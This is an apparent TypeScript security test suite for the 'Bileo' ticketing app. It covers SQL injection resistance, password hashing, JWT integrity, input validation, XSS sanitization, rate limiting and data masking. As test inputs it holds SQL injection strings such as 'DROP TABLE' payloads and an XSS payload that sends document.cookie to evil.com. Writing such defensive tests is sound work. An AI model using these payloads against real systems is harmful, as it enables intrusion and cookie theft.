import { describe, it, expect } from './test_framework';
import { db } from '../server/db/database';
import { AuthService } from '../server/security/auth';
import {
  RegisterSchema,
  LoginSchema,
  CreateBookingSchema,
  PassengerItemSchema,
  DataMasker,
  sanitizeInput,
} from '../server/security/validation';
import { RateLimiter } from '../server/security/rateLimiter';
import { TicketingService } from '../server/services/ticketingService';

export function runSecurityHardeningTests() {
  describe('Security Suite 1: Zero-Trust SQL Injection (SQLi) Immunity Matrix', () => {
    it('1.1 Classic SQL Injection in Email Field: treated as literal string, no bypass', async () => {
      db.getInMemoryEngine().clearAll();
      await db.query(
        'INSERT INTO users (id, email, password_hash, full_name, phone, role, kvkk_accepted) VALUES ($1, $2, $3, $4, $5, $6, $7)',
        ['u1', 'admin@bileo.com', 'hash_val', 'Admin User', '05551112233', 'admin', true]
      );

      const sqliPayloads = [
        "' OR '1'='1",
        "admin@bileo.com' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "'; DROP TABLE users; --",
        "UNION SELECT * FROM users",
        "' OR ''='",
        "admin@bileo.com' /*!50000OR*/ 1=1 --",
      ];

      for (const payload of sqliPayloads) {
        const res = await db.query('SELECT * FROM users WHERE email = $1', [payload]);
        expect(res.rowCount).toBe(0);
      }
    });

    it('1.2 Destructive SQL Injection (DROP TABLE) via Parameterized Query: safely isolated', async () => {
      const destructivePayload = "u1'; DROP TABLE bookings; --";
      await db.query('SELECT * FROM users WHERE id = $1', [destructivePayload]);

      const checkRes = await db.query('SELECT * FROM users');
      expect(Array.isArray(checkRes.rows)).toBe(true);
    });

    it('1.3 PNR Parameterized Query Injection: refuses unauthorized ticket access', async () => {
      const maliciousPnr = "PNR-100000' OR '1'='1";
      const res = await db.query('SELECT * FROM bookings WHERE pnr = $1', [maliciousPnr]);
      expect(res.rowCount).toBe(0);
    });
  });

  describe('Security Suite 2: Cryptographic Password Hashing & Bcrypt Salting', () => {
    it('2.1 Bcrypt Salt Generation & One-Way Irreversibility', async () => {
      const plain = 'BileoSecure2026!';
      const hash1 = await AuthService.hashPassword(plain);
      const hash2 = await AuthService.hashPassword(plain);

      expect(hash1 === plain).toBe(false);
      expect(hash2 === plain).toBe(false);
      expect(hash1 === hash2).toBe(false);
      expect(hash1.startsWith('$2a$') || hash1.startsWith('$2b$')).toBe(true);
    });

    it('2.2 Timing-Safe Password Verification', async () => {
      const plain = 'StrongPass123!';
      const hash = await AuthService.hashPassword(plain);

      const match = await AuthService.verifyPassword(plain, hash);
      const fail = await AuthService.verifyPassword('WrongPass123!', hash);

      expect(match).toBe(true);
      expect(fail).toBe(false);
    });

    it('2.3 Password Complexity & Entropy Validation', () => {
      const weak1 = AuthService.validatePasswordStrength('short');
      const weak2 = AuthService.validatePasswordStrength('nouppercase123');
      const weak3 = AuthService.validatePasswordStrength('NOLOWERCASE123');
      const weak4 = AuthService.validatePasswordStrength('NoNumbersHere');
      const strong = AuthService.validatePasswordStrength('ValidBileo2026');

      expect(weak1.isValid).toBe(false);
      expect(weak2.isValid).toBe(false);
      expect(weak3.isValid).toBe(false);
      expect(weak4.isValid).toBe(false);
      expect(strong.isValid).toBe(true);
    });
  });

  describe('Security Suite 3: JWT Authentication & Token Integrity', () => {
    it('3.1 Token Generation & Cryptographic Verification', () => {
      const payload = { userId: 'usr_101', email: 'user@bileo.com', role: 'user' };
      const token = AuthService.signToken(payload);

      const decoded = AuthService.verifyToken(token);
      expect(decoded.userId).toBe(payload.userId);
      expect(decoded.email).toBe(payload.email);
    });

    it('3.2 Rejection of Tampered Token Payload or Signature', () => {
      const payload = { userId: 'usr_101', email: 'user@bileo.com', role: 'user' };
      const token = AuthService.signToken(payload);

      const parts = token.split('.');
      const tamperedToken = `${parts[0]}.eyRhZG1pbjpmYWxzZX0.${parts[2]}`;

      let failed = false;
      try {
        AuthService.verifyToken(tamperedToken);
      } catch {
        failed = true;
      }
      expect(failed).toBe(true);
    });

    it('3.3 Rejection of Malformed and Empty Tokens', () => {
      const invalidTokens = ['', 'invalid.token', 'a.b.c.d', 'Bearer xyz'];
      for (const t of invalidTokens) {
        let errorCaught = false;
        try {
          AuthService.verifyToken(t);
        } catch {
          errorCaught = true;
        }
        expect(errorCaught).toBe(true);
      }
    });
  });

  describe('Security Suite 4: Zod Strict Schema Validation & Perimeter Defense', () => {
    it('4.1 Registration Schema Enforces Valid Email, Phone & KVKK', () => {
      const validData = {
        fullName: 'Ahmet Yılmaz',
        email: 'ahmet@example.com',
        phone: '05321234567',
        password: 'SecurePassword123',
        kvkkAccepted: true,
      };
      const parsed = RegisterSchema.safeParse(validData);
      expect(parsed.success).toBe(true);

      const invalidKVKK = RegisterSchema.safeParse({ ...validData, kvkkAccepted: false });
      expect(invalidKVKK.success).toBe(false);

      const invalidPhone = RegisterSchema.safeParse({ ...validData, phone: '12345' });
      expect(invalidPhone.success).toBe(false);
    });

    it('4.2 Passenger Turkish Republic ID (TCKN) Validation', () => {
      const validPassenger = {
        firstName: 'Mehmet',
        lastName: 'Kaya',
        tc: '12345678901',
        gender: 'male' as const,
      };
      const res = PassengerItemSchema.safeParse(validPassenger);
      expect(res.success).toBe(true);

      const invalidTC1 = PassengerItemSchema.safeParse({ ...validPassenger, tc: '01234567890' });
      const invalidTC2 = PassengerItemSchema.safeParse({ ...validPassenger, tc: '12345ABC890' });
      const invalidTC3 = PassengerItemSchema.safeParse({ ...validPassenger, tc: '123' });

      expect(invalidTC1.success).toBe(false);
      expect(invalidTC2.success).toBe(false);
      expect(invalidTC3.success).toBe(false);
    });

    it('4.3 Booking Payment Information Validation', () => {
      const validBooking = {
        routeId: 'r-101',
        seats: ['12'],
        passengers: [
          {
            firstName: 'Ali',
            lastName: 'Demir',
            tc: '98765432109',
            gender: 'male' as const,
          },
        ],
        contactEmail: 'ali@demir.com',
        contactPhone: '05551234567',
        cardNumber: '4543123456789012',
        cardExpiry: '12/28',
        cardCvv: '432',
      };
      const res = CreateBookingSchema.safeParse(validBooking);
      expect(res.success).toBe(true);

      const invalidCard = CreateBookingSchema.safeParse({ ...validBooking, cardNumber: '1234' });
      const invalidExpiry = CreateBookingSchema.safeParse({ ...validBooking, cardExpiry: '99/99' });
      const invalidCvv = CreateBookingSchema.safeParse({ ...validBooking, cardCvv: '12' });

      expect(invalidCard.success).toBe(false);
      expect(invalidExpiry.success).toBe(false);
      expect(invalidCvv.success).toBe(false);
    });
  });

  describe('Security Suite 5: Cross-Site Scripting (XSS) Sanitization', () => {
    it('5.1 Script Tag and Iframe Elimination', () => {
      const malicious = '<script>alert("XSS")</script>John Doe<iframe src="evil.com"></iframe>';
      const sanitized = sanitizeInput(malicious);

      expect(sanitized.includes('<script>')).toBe(false);
      expect(sanitized.includes('alert(')).toBe(false);
      expect(sanitized.includes('<iframe')).toBe(false);
      expect(sanitized.includes('John Doe')).toBe(true);
    });

    it('5.2 Inline Event Handler Elimination (onerror, onload, onclick)', () => {
      const malicious = '<img src=x onerror="fetch(`http://evil.com?c=`+document.cookie)" />Mehmet';
      const sanitized = sanitizeInput(malicious);

      expect(sanitized.includes('onerror=')).toBe(false);
      expect(sanitized.includes('evil.com')).toBe(false);
    });

    it('5.3 Javascript Pseudo-Protocol Neutralization', () => {
      const malicious = 'javascript:alert(1)';
      const sanitized = sanitizeInput(malicious);
      expect(sanitized.toLowerCase().startsWith('javascript:')).toBe(false);
    });
  });

  describe('Security Suite 6: API Rate Limiting & Brute-Force Defense', () => {
    it('6.1 Rate Limiter Enforces Maximum Allowed Requests in Window', () => {
      const testKey = 'test_ip_192_168_1_1';
      RateLimiter.reset(testKey);

      for (let i = 1; i <= 5; i++) {
        const check = RateLimiter.check(testKey, 5, 1000);
        expect(check.allowed).toBe(true);
      }

      const blockedCheck = RateLimiter.check(testKey, 5, 1000);
      expect(blockedCheck.allowed).toBe(false);
      expect(blockedCheck.retryAfterMs > 0).toBe(true);
    });

    it('6.2 Rate Limiter Recovers After Window Expiry', async () => {
      const testKey = 'test_expiry_key';
      RateLimiter.reset(testKey);

      RateLimiter.check(testKey, 1, 50);
      const blocked = RateLimiter.check(testKey, 1, 50);
      expect(blocked.allowed).toBe(false);

      await new Promise((r) => setTimeout(r, 60));

      const recovered = RateLimiter.check(testKey, 1, 50);
      expect(recovered.allowed).toBe(true);
    });
  });

  describe('Security Suite 7: KVKK / GDPR Sensitive Data Masking & Data Leakage Prevention', () => {
    it('7.1 Turkish Republic ID (TCKN) Partial Masking: displays first 3 and last 2 digits only', () => {
      const tc = '12345678901';
      const masked = DataMasker.maskTCKN(tc);
      expect(masked).toBe('123*****01');
    });

    it('7.2 Credit Card Number Masking: displays last 4 digits only', () => {
      const cc = '5400123456789876';
      const masked = DataMasker.maskCreditCard(cc);
      expect(masked).toBe('**** **** **** 9876');
    });

    it('7.3 Email and Phone Masking for Privacy', () => {
      const email = 'mehmet.yilmaz@bileo.com';
      const maskedEmail = DataMasker.maskEmail(email);
      expect(maskedEmail.includes('***')).toBe(true);

      const phone = '05321234567';
      const maskedPhone = DataMasker.maskPhone(phone);
      expect(maskedPhone.includes('**')).toBe(true);
    });
  });

  describe('Security Suite 8: Atomic Transaction Isolation & Safe Rollback', () => {
    it('8.1 TicketingService CreateBooking and Refund Flow with Audit Compliance', async () => {
      db.getInMemoryEngine().clearAll();
      RateLimiter.reset();

      const regRes = await TicketingService.registerUser({
        fullName: 'Ayşe Kaya',
        email: 'ayse@bileo.com',
        phone: '05441112233',
        password: 'StrongBileoPass1',
        kvkkAccepted: true,
      });
      expect(Boolean(regRes.token)).toBe(true);

      const bookingRes = await TicketingService.createBooking(
        {
          routeId: 'r-101',
          seats: [14],
          passengers: [
            {
              firstName: 'Ayşe',
              lastName: 'Kaya',
              tc: '11223344556',
              gender: 'female',
            },
          ],
          contactEmail: 'ayse@bileo.com',
          contactPhone: '05441112233',
          cardNumber: '4543111122223333',
          cardExpiry: '10/27',
          cardCvv: '888',
        },
        regRes.userId
      );

      expect(Boolean(bookingRes.pnr)).toBe(true);
      expect(bookingRes.status).toBe('confirmed');

      const refundRes = await TicketingService.refundTicket({ pnr: bookingRes.pnr });
      expect(refundRes.status).toBe('refunded');
    });
  });
}
